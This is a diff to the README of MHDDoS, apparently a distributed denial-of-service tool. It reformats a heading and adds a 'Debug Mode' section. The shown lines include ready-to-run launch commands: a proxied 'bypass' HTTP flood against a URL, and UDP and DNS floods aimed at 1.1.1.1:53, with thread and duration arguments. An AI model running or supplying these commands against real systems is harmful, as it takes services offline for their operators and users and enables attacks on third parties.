@@ -110,9 +110,8 @@ cd MHDDoS
 pip3 install -r requirements.txt
 ```
 
----
 
-**Launch Script**
+## Launch Script
 
 | Proxy Type        | Value    |
 | ----------------- | -------- |
@@ -130,6 +129,12 @@ python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100
 ```console
 python3 start.py udp 1.1.1.1:53 1 100
 python3 start.py dns 1.1.1.1:53 1 100 dns.txt
+```
+
+* Debug Mode (L4/L7):
+```console
+python3 start.py bypass https://example.com 5 1000 socks5.txt 100 100 true
+python3 start.py udp 1.1.1.1:53 1 100 true
 ```
 
 * Tools/Help:
